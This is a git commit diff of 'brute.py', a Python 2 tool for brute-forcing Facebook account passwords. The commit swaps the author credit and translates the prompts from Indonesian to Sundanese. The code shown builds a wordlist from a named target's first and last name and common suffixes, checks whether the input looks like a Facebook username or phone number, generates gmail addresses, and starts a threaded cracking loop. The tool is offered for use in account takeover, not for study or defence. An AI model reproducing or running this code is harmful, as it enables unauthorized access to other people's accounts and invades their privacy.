ce4bf76e6ae57f874b723ca22a38132be967ddad
SFGamink <72718264+SFGamink@users.noreply.github.com>
2020-11-09 07:40:56 +0700

    Update brute.py

--- brute.py
+++ brute.py
@@ -1,6 +1,6 @@
 # -*- coding UTF-8 -*-
-#  Author : Iqbal Dev
-#  Tools : Geli2 Efbeh
+#  Author : Surya Gumawang
+#  Tools : SFGamink
 #  Versi : 0.4
 
 from prettytable import PrettyTable
@@ -8,7 +8,7 @@ from multiprocessing.pool import Process, ThreadPool
 from useragents import user_agents, string1, string2, deviv, divev
 import os, sys, time, requests, json
 
-s = '\n  \033[92;1m         Suksess... \n        Password Found '
+	s = '\n  \033[92;1m         Beres... \n        Password Aya '
 multi_dev = []
 sandi = []
 
@@ -16,12 +16,12 @@ def Wordlist():
 
 	try:
 		print string1
-		print "\033[96;1m        B U A T   W O R D L I $ T "
+		print "\033[96;1m        N Y I E U N   W O R D L I $ T "
 		print '\033[92;1m+'+'-'*38+'+' 
-		nama1 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Depan Target\033[93;1m : ")
-		nama2 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Belakang Target\033[93;1m : ")
+		nama1 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Abuskeun Ngaran Harep Target\033[93;1m : ")
+		nama2 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Abuskeun Ngaran Tukang Target\033[93;1m : ")
 		if nama1 == '' or nama2 == '':
-			sys.exit("\n\033[91;1m Jangan Kosong dong Sayang!\n Kamu Keluar...")
+			sys.exit("\n\033[91;1m Tong Kosong!\n Didinya Kaluar...")
 		d = nama1.replace(' ', '').replace('  ', '')
 		b = nama2.replace(' ', '').replace('  ', '')
 		lis = ['123','12345','321']
@@ -33,24 +33,24 @@ def Wordlist():
 		sandi.append('sayang')
 		sandi.append('anjing')
 	except KeyboardInterrupt:
-		print "\n Keluar.... "
+		print "\n Kaluar.... "
 
-	print " \n\033[92;1m   Suksess Membuat Wordlist..."
+	print " \n\033[92;1m   Suksess Nyieun Wordlist..."
 		
 user1 = []
 
 def target():
 	global target
 	print string2
-	user = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Username Target:\n\033[93;1m  => \033[97;1m ")	
+	user = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Abuskeun Username Target:\n\033[93;1m  => \033[97;1m ")	
 	if '08' not in user and '+62' not in user and '.' not in user and '1000' not in user and 'www.facebook.com' not in user and 'web.facebook.com' not in user or '@' in user[0]:
 		print '\033[91;1m+'+'-'*38+'+'
-		print "\033[97;1m Masukkin Username Lol, Bukan Nama orangnya..\n Tapi gk pp lah, kamu masih bisa crack \n Walaupun Tidak Bertarget.."
+		print "\033[97;1m Abuskeun Username Asw, Lain Ngaran Jalmana..\n Tapi Te Nananon lah, Didinya Bisa Keneh Nyokot \n Walaupun Henteu Bertarget.."
 		print '\033[91;1m+'+'-'*38+'+'
 		gm = user.replace(' ', '').replace('@', '')
 		for dev in range(1, 51):
 			user1.append(gm+str(dev)+'@gmail.com')
-		print "\n\033[92;1m Cracking Berjalan.......\n"
+		print "\n\033[92;1m Cokot Ekeur Berjalan.......\n"
 		h_sandi = [sandi[0], sandi[1]]
 		def br_dev(usr):
 			for pas in h_sandi:
@@ -127,6 +127,6 @@ def brute():
 	dev.map(br_dev1, sandi)
 	divev()
 	deviv()
-	print '\n\033[92;1m    Selesai Broo..... \n  '
+	print '\n\033[92;1m    Beres Lurdd..... \n  '
 
 
